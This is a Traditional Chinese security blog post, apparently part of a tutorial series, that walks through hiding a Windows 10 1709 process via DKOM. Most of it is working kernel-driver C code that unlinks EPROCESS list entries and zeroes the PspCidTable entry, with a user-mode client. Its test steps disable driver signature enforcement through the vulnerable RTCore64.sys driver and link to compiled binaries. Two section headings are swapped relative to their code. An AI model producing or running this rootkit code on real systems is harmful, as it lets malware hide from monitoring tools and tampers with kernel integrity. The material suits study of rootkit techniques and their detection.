# 【第 25 話】DKOM 隱藏 Process（下）


## 文章大綱
在[【第 23 話】DKOM 隱藏 Process（上）](/asset/第%2023%20話)了解 DKOM 的原理，並且在[【第 24 話】DKOM 隱藏 Process（中）](/asset/第%2024%20話)用 WinDbg 實作一遍，這篇我們要寫程式自動化這個流程。


## 寫程式
程式講解會分成以下幾個部分，注意這個 PoC 只適用於 Windows 10 1709。完整的專案也放在我的 GitHub [zeze-zeze/2023iThome](https://github.com/zeze-zeze/2023iThome/tree/master/HideProcess)。
- ActiveProcessLinks 斷鏈
- HandleTableList 斷鏈
- ProcessListEntry 斷鏈
- PspCidTable 清零
- Dispatcher
- 應用程式

### ActiveProcessLinks 斷鏈
ActiveProcessLinks 在 EPROCESS 的 Offset 0x2e8，取得 ActiveProcessLinks 然後改 `Flink->Blink` 和 `Blink->Flink` 斷鏈。

```c
VOID UnlinkActiveProcessLists(PEPROCESS PE)
{
    // 在 EPROCESS 的 Offset 0x2e8 取得 ActiveProcessLink
    LIST_ENTRY* ActiveProcessLink = (LIST_ENTRY*)((ULONG64)PE + 0x2e8);

    // 將 ActiveProcessLink 斷鏈
    if (ActiveProcessLink->Blink != 0 && ActiveProcessLink->Flink != 0)
    {
        ActiveProcessLink->Blink->Flink = ActiveProcessLink->Flink;
        ActiveProcessLink->Flink->Blink = ActiveProcessLink->Blink;
        ActiveProcessLink->Blink = 0;
        ActiveProcessLink->Flink = 0;
    }
}
```

### HandleTableList 斷鏈
HandleTableList 在 EPROCESS 裡的 Pcb，也是 EPROCESS 的 Offset 0x240，取得 HandleTableList 位址然後改 `Flink->Blink` 和 `Blink->Flink` 斷鏈。 

```c
VOID UnlinkProcessListEntry(PEPROCESS PE)
{
    // 取得在 EPROCESS 的 Pcb 中的 ProcessListEntry (Offset 0x240)
    LIST_ENTRY* ProcessListEntry = (LIST_ENTRY*)((ULONG64)PE + 0x240);

    // 將 ProcessListEntry 斷鏈
    if (ProcessListEntry->Blink != 0 && ProcessListEntry->Flink != 0)
    {
        ProcessListEntry->Blink->Flink = ProcessListEntry->Flink;
        ProcessListEntry->Flink->Blink = ProcessListEntry->Blink;
        ProcessListEntry->Blink = 0;
        ProcessListEntry->Flink = 0;
    }
}
```


### ProcessListEntry 斷鏈
從 EPROCESS 的 Offset 0x418 取得 HandleTable，再從 HandleTable 的 Offset 0x18 取得 HandleTableList，最後改 `Flink->Blink` 和 `Blink->Flink` 斷鏈。 

```c
VOID UnlinkHandleTableList(PEPROCESS PE)
{
    // 在 EPROCESS 的 Offset 0x418 取得 HandleTable
    ULONG64 HandleTable = *(PULONG64)((ULONG64)PE + 0x418);

    // 再從 HandleTable 的 Offset 0x18 取得 HandleTableList
    LIST_ENTRY* HandleTableList = (LIST_ENTRY*)(HandleTable + 0x18);

    // 將 HandleTableList 斷鏈
    HandleTableList->Blink->Flink = HandleTableList->Flink;
    HandleTableList->Flink->Blink = HandleTableList->Blink;
    HandleTableList->Blink = HandleTableList;
    HandleTableList->Flink = HandleTableList;
}
```


### PspCidTable 清零
首先取得 `PsLookupProcessByProcessId` 位址，從 `PsLookupProcessByProcessId` 中找 `PspReferenceCidTableEntry` 的位址，再從 `PspReferenceCidTableEntry` 中找到 PspCidTable。

```c
BOOLEAN get_PspCidTable(ULONG64* tableAddr)
{
    // 取得 PsLookupProcessByProcessId 位址
    UNICODE_STRING uc_funcName;
    RtlInitUnicodeString(&uc_funcName, L"PsLookupProcessByProcessId");
    ULONG64 ul_funcAddr = (ULONG64)MmGetSystemRoutineAddress(&uc_funcName);

    // 在 PsLookupProcessByProcessId 的前 0x30 Bytes 中找 call PspReferenceCidTableEntry 的位址
    ULONG64 ul_entry = 0;
    for (INT i = 0; i < 0x30; i++)
    {
        // 用 call 的 opcode 0xe8 定位 PspReferenceCidTableEntry
        if (*(PUCHAR)(ul_funcAddr + i) == 0xe8)
        {
            ul_entry = ul_funcAddr + i;
            break;
        }
    }

    if (ul_entry != 0)
    {
        // Parse 出 PspReferenceCidTableEntry 的位址
        INT i_callCode = *(INT*)(ul_entry + 1);
        ULONG64 ul_callJmp = ul_entry + i_callCode + 5;

        // 在 PspReferenceCidTableEntry 的前 0x30 Bytes 中找 PspCidTable
        for (INT i = 0; i < 0x30; i++)
        {
            // 用 "mov rax, [PspCidTable]" 特徵定位 PspCidTable
            if (*(PUCHAR)(ul_callJmp + i) == 0x48 && *(PUCHAR)(ul_callJmp + i + 1) == 0x8b &&
                *(PUCHAR)(ul_callJmp + i + 2) == 0x05)
            {
                // Parse 出 PspCidTable 的位址
                INT i_movCode = *(INT*)(ul_callJmp + i + 3);
                ULONG64 ul_movJmp = ul_callJmp + i + i_movCode + 7;
                *tableAddr = *(ULONG64*)ul_movJmp;
                return TRUE;
            }
        }
    }

    return FALSE;
}
```

有了 PspCidTable 之後，取得 PspCidTable 的 TableCode，由最後 3 bits 判斷這是幾級指標。根據不同級指標，要 Reference 不同次數的 Table 才可以找到 EPROCESS 的 Entry，找到目標 Process 的 Entry 後就把它清零。

```c
VOID NullPspCidTable(ULONG64 pid)
{
    // 取得 PspCidTable
    ULONG64 PspCidTable = 0;
    if (get_PspCidTable(&PspCidTable))
    {
        ULONG64 entry;

        // 取得 PspCidTable 中 _HANDLE_TABLE 結構裡的 TableCode，最後 3 bits 則代表幾級指標
        ULONG64 TableCode = *((ULONG64*)PspCidTable + 1);
        ULONG64 TableLevel = TableCode & 3;

        if ((ULONG)TableLevel == 2)
        {
            // 如果是三級指標，要 Reference 2 次 Table 才能找到 EPROCESS 的 Entry
            ULONG64 EprocessList = *(ULONG64*)(*(ULONG64*)(TableCode + 8 * (pid >> 19) - 2) + 8 * ((pid >> 10) & 0x1FF));
            entry = EprocessList + 4 * (pid & 0x3FF);
        }
        else if ((ULONG)TableLevel == 1)
        {
            // 如果是二級指標，只要 Reference 1 次 Table 才能找到 EPROCESS 的 Entry
            ULONG64 EprocessList = *(ULONG64*)(TableCode + 8 * (pid >> 10) - 1);
            entry = EprocessList + 4 * (pid & 0x3FF);
        }
        else
        {
            // 如果是一級指標，可以直接算出 EPROCESS 的 Entry
            entry = TableCode + 4 * pid;
        }

        // 將目標 Process 的 Entry 清零
        *(PULONG64)entry = 0;
    }
}
```


### Dispatcher
接收從應用程式傳來的 pid，並隱藏目標 Process。

```c
case IRP_MJ_DEVICE_CONTROL:
    // 取得從應用程式傳來的資料
    inputBufferLength = ioStackLocation->Parameters.DeviceIoControl.InputBufferLength;
    outputBufferLength = ioStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
    ioControlCode = ioStackLocation->Parameters.DeviceIoControl.IoControlCode;
    HANDLE processId = *(HANDLE*)pIrp->AssociatedIrp.SystemBuffer;

    // 根據 IoControlCode 做對應處理
    switch (ioControlCode)
    {
        case HIDE_PROCESS:
            // 隱藏目標 Process
            PsLookupProcessByProcessId(processId, &pEprocess);
            UnlinkActiveProcessLists(pEprocess);
            UnlinkHandleTableList(pEprocess);
            UnlinkProcessListEntry(pEprocess);
            NullPspCidTable((ULONG64)processId);
            break;
        default:
            break;
    }
    break;
```


### 應用程式
從應用層呼叫 `DeviceIoControl` 將資料傳入驅動程式，也就是要隱藏的目標 pid。

```c
#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\HideProcess"
#define HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(int argc, char* argv[])
{
    HANDLE hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        std::cout << "CreateFile error: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD dwWrite;
    DWORD ProcessId;
    std::cout << "Give me a pid: ";
    std::cin >> ProcessId;

    // 呼叫 DeviceIoControl 將資料傳入驅動程式，也就是要隱藏的目標 pid
    DeviceIoControl(hDevice, HIDE_PROCESS, &ProcessId, sizeof(ProcessId), NULL, 0, &dwWrite, NULL);

    CloseHandle(hDevice);

    return 0;
}
```


## 測試
這篇實作的驅動程式的測試方式比較特別，因為要在 PatchGuard 有運作的狀態下隱藏 Process，所以不能使用 VirtualKD-Redux，又要載入沒有合法簽章的驅動程式。步驟如下：
1. 使用[【第 22 話】繞過數位簽章](/asset/第%2022%20話)講解的方法，載入 [RTCore64.sys](https://github.com/zeze-zeze/2023iThome/blob/master/CVE-2019-16098/bin/RTCore64.sys)，然後執行 [AbuseDSE.exe](https://github.com/zeze-zeze/2023iThome/blob/master/AbuseDSE/bin/AbuseDSE.exe)，把 DSE 關閉
2. 因為 DSE 關閉了，這時就可以載入未簽章的驅動程式 [HideProcessDrv.sys](https://github.com/zeze-zeze/2023iThome/blob/master/HideProcess/bin/HideProcessDrv.sys)
3. 執行 [HideProcess.exe](https://github.com/zeze-zeze/2023iThome/blob/master/HideProcess/bin/HideProcess.exe) 並輸入要隱藏的目標 pid，用 Process Explorer 就找不到目標 Process 了
4. 再將 DSE 開啟，避免系統不穩定


## 參考資料
- [Manipulating ActiveProcessLinks to Hide Processes in Userland](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland)
- [[原创]某地牛逼哄哄的内部辅X,通过进程断链让DWM复活](https://bbs.kanxue.com/thread-270932.htm)
- [zeze-zeze/GhostProcess](https://github.com/zeze-zeze/GhostProcess)
- [GHOST PROCESS - HIDE PROCESS IN KERNEL EVADING PATCHGUARD](https://vxcon.hk/)
- [EPROCESS](https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html)